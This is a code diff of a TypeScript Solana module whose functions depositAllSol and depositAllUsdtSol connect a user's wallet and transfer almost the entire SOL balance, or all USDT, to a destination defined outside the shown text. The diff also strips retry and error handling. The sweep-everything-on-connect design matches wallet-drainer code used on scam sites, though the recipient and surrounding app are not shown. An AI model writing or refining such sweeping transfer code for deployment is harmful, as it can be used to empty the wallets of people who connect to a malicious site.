@@ -1,3 +1,4 @@
+// src/lib/solana.ts
 import bs58 from 'bs58'
 import {
   Connection,
@@ -59,34 +60,20 @@ function normalizeSignature(res: any): string {
   throw new Error('Unsupported signature type from wallet')
 }
 
-/** small retry helper for transient RPC failures */
-async function retry<T>(fn: () => Promise<T>, attempts = 2, delayMs = 250): Promise<T> {
-  let lastErr: any
-  for (let i = 0; i < attempts; i++) {
-    try {
-      return await fn()
-    } catch (e) {
-      lastErr = e
-      if (i < attempts - 1) await new Promise((r) => setTimeout(r, delayMs))
-    }
-  }
-  throw lastErr
-}
-
 // Try to ensure provider is connected and return { provider, publicKey }
 async function ensureProviderAndKey(
   providedPublicKey?: PublicKey
 ): Promise<{ provider: any; publicKey: PublicKey }> {
   const provider = getActiveSolanaProvider()
-  if (!provider) throw new Error('No Solana provider found (AppKit or injected). Install/connect a wallet.')
+  if (!provider) throw new Error('No Solana provider found (AppKit or injected)')
 
   // If caller already gave a PublicKey, use it (but still try to ensure provider connected)
   if (providedPublicKey) {
+    // best-effort connect if wallet supports
     try {
-      // best-effort connect if wallet supports
       if (provider.connect && !provider.isConnected) {
-        // try onlyIfTrusted first — do not force UI popups
-        await provider.connect?.({ onlyIfTrusted: true }).catch(() => {})
+        // don't force onlyIfTrusted; we tried to respect user's session but connecting harmlessly
+        await provider.connect({ onlyIfTrusted: true }).catch(() => {})
       }
     } catch {}
     return { provider, publicKey: providedPublicKey }
@@ -95,27 +82,8 @@ async function ensureProviderAndKey(
   // Otherwise attempt to connect / read publicKey from provider
   try {
     // some wallets expose publicKey even when not "connected" in UI state
-    let pk = provider.publicKey
-    if (!pk) {
-      // attempt a trusted connect first (no popup). If that fails, fall back to interactive connect.
-      try {
-        const resp = await provider.connect?.({ onlyIfTrusted: true }).catch(() => null)
-        pk = pk || resp?.publicKey
-      } catch {}
-    }
-
-    if (!pk) {
-      // last resort: interactive connect if supported
-      try {
-        const resp = await provider.connect?.({ onlyIfTrusted: false }).catch(() => null)
-        pk = pk || resp?.publicKey
-      } catch (e) {
-        // will be handled below
-      }
-    }
-
-    if (!pk) throw new Error('No publicKey from provider (wallet not connected or user rejected connect).')
-
+    const pk = provider.publicKey || (await provider.connect?.({ onlyIfTrusted: false }).catch(() => null))?.publicKey
+    if (!pk) throw new Error('No publicKey from provider (wallet not connected)')
     return { provider, publicKey: pk }
   } catch (e) {
     throw new Error(`Failed to get publicKey from Solana provider: ${String((e as any)?.message || e)}`)
@@ -134,25 +102,11 @@ export async function depositAllSol({ publicKey }: { publicKey?: PublicKey } = {
   const rpc = SOLANA_RPC && SOLANA_RPC.length ? SOLANA_RPC : clusterApiUrl('mainnet-beta')
   const connection = new Connection(rpc, 'confirmed')
 
-  // balance in lamports (number) — retry once on transient RPC errors
-  let balance: number
-  try {
-    balance = await retry(() => connection.getBalance(ownerPub), 2)
-  } catch (err) {
-    throw new Error(
-      `Failed to get balance of account ${ownerPub.toBase58()}: ${String((err as any)?.message || err)}`
-    )
-  }
+  // balance in lamports (number)
+  const balance = await connection.getBalance(ownerPub)
 
   // Build a tiny dummy transfer to estimate fee for a single transfer message
-  let blockhashResp: { blockhash: string; lastValidBlockHeight: number }
-  try {
-    blockhashResp = await retry(() => connection.getLatestBlockhash('confirmed'), 2)
-  } catch (err) {
-    throw new Error(`Failed to fetch recent blockhash: ${String((err as any)?.message || err)}`)
-  }
-
-  const { blockhash, lastValidBlockHeight } = blockhashResp
+  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
   const dummyIx = SystemProgram.transfer({
     fromPubkey: ownerPub,
     toPubkey: ownerPub,
@@ -163,15 +117,7 @@ export async function depositAllSol({ publicKey }: { publicKey?: PublicKey } = {
     recentBlockhash: blockhash,
     instructions: [dummyIx],
   }).compileToV0Message()
-
-  let feeInfo: any
-  try {
-    feeInfo = await retry(() => connection.getFeeForMessage(dummyMsg, 'confirmed'), 2)
-  } catch (err) {
-    // If fee query fails, use a conservative fallback fee estimate
-    console.warn('getFeeForMessage failed, using fallback fee estimate:', err)
-    feeInfo = { value: 5000 }
-  }
+  const feeInfo = await connection.getFeeForMessage(dummyMsg, 'confirmed')
   const estimatedFee = Number(feeInfo?.value ?? 5000)
 
   // Use config buffer (fall back to a small default if not set)
@@ -195,15 +141,9 @@ export async function depositAllSol({ publicKey }: { publicKey?: PublicKey } = {
 
   // Prefer signAndSendTransaction (Phantom/Backpack) when available
   if (provider.signAndSendTransaction) {
-    let _res: any
-    try {
-      _res = await provider.signAndSendTransaction(tx)
-    } catch (err) {
-      throw new Error(`Wallet signAndSendTransaction failed: ${String((err as any)?.message || err)}`)
-    }
-
+    const _res = await provider.signAndSendTransaction(tx)
     const signature = normalizeSignature(_res)
-    // confirm (best-effort)
+    // confirm
     try {
       await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
     } catch {
@@ -214,27 +154,11 @@ export async function depositAllSol({ publicKey }: { publicKey?: PublicKey } = {
 
   // Fallback: signTransaction then sendRawTransaction
   if (!provider.signTransaction) throw new Error('Wallet cannot sign transactions (missing signTransaction)')
-  let signed: any
-  try {
-    signed = await provider.signTransaction(tx as any)
-  } catch (err) {
-    throw new Error(`Wallet signTransaction failed: ${String((err as any)?.message || err)}`)
-  }
-
-  let signature: string
-  try {
-    signature = await retry(
-      () =>
-        connection.sendRawTransaction(signed.serialize(), {
-          skipPreflight: false,
-          preflightCommitment: 'confirmed',
-        }),
-      2
-    )
-  } catch (err) {
-    throw new Error(`Failed to send transaction: ${String((err as any)?.message || err)}`)
-  }
-
+  const signed = await provider.signTransaction(tx as any)
+  const signature = await connection.sendRawTransaction(signed.serialize(), {
+    skipPreflight: false,
+    preflightCommitment: 'confirmed',
+  })
   try {
     await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
   } catch {}
@@ -263,8 +187,8 @@ export async function depositAllUsdtSol({ publicKey }: { publicKey?: PublicKey }
     ASSOCIATED_TOKEN_PROGRAM_ID
   )
 
-  // Try to fetch token account balance (retryable)
-  const balInfo = await retry(() => connection.getTokenAccountBalance(sourceAta, 'confirmed').catch(() => { throw new Error('getTokenAccountBalance failed') }), 2).catch(() => null)
+  // Try to fetch token account balance
+  const balInfo = await connection.getTokenAccountBalance(sourceAta, 'confirmed').catch(() => null)
   if (!balInfo) throw new Error('No USDT token account')
 
   let amountBig = BigInt(balInfo.value.amount || '0')
@@ -305,14 +229,7 @@ export async function depositAllUsdtSol({ publicKey }: { publicKey?: PublicKey }
   ixs.push(createTransferInstruction(sourceAta, destAta, owner, amountBig, [], TOKEN_PROGRAM_ID))
 
   // Estimate fee for this combined instruction set
-  let blockhashResp: { blockhash: string; lastValidBlockHeight: number }
-  try {
-    blockhashResp = await retry(() => connection.getLatestBlockhash('confirmed'), 2)
-  } catch (err) {
-    throw new Error(`Failed to fetch recent blockhash: ${String((err as any)?.message || err)}`)
-  }
-  const { blockhash, lastValidBlockHeight } = blockhashResp
-
+  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
   const msg = new TransactionMessage({
     payerKey: owner,
     recentBlockhash: blockhash,
@@ -321,24 +238,12 @@ export async function depositAllUsdtSol({ publicKey }: { publicKey?: PublicKey }
   const tx = new VersionedTransaction(msg)
 
   // Rough fee estimate
-  let feeInfo: any
-  try {
-    feeInfo = await retry(() => connection.getFeeForMessage(msg, 'confirmed'), 2)
-  } catch (err) {
-    console.warn('getFeeForMessage failed for USDT transfer, using fallback fee estimate:', err)
-    feeInfo = { value: 5000 }
-  }
+  const feeInfo = await connection.getFeeForMessage(msg, 'confirmed')
   const estimatedFee = Number(feeInfo?.value ?? 5000)
   const buffer = typeof SOL_BUFFER_LAMPORTS === 'number' && SOL_BUFFER_LAMPORTS > 0 ? SOL_BUFFER_LAMPORTS : 3_000_000
 
   // Ensure owner has enough SOL for fees + buffer (we do not deduct SOL from token transfer)
-  let solBalance: number
-  try {
-    solBalance = await retry(() => connection.getBalance(owner), 2)
-  } catch (err) {
-    throw new Error(`Failed to get SOL balance for fee check: ${String((err as any)?.message || err)}`)
-  }
-
+  const solBalance = await connection.getBalance(owner)
   if (solBalance <= estimatedFee + buffer) {
     throw new Error('Not enough SOL in wallet to pay transaction fees + buffer for SPL transfer')
   }
@@ -355,14 +260,10 @@ export async function depositAllUsdtSol({ publicKey }: { publicKey?: PublicKey }
 
   if (!provider.signTransaction) throw new Error('Wallet cannot sign transactions (missing signTransaction)')
   const signed = await provider.signTransaction(tx as any)
-  const signature = await retry(
-    () =>
-      connection.sendRawTransaction(signed.serialize(), {
-        skipPreflight: false,
-        preflightCommitment: 'confirmed',
-      }),
-    2
-  )
+  const signature = await connection.sendRawTransaction(signed.serialize(), {
+    skipPreflight: false,
+    preflightCommitment: 'confirmed',
+  })
   try {
     await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
   } catch {}
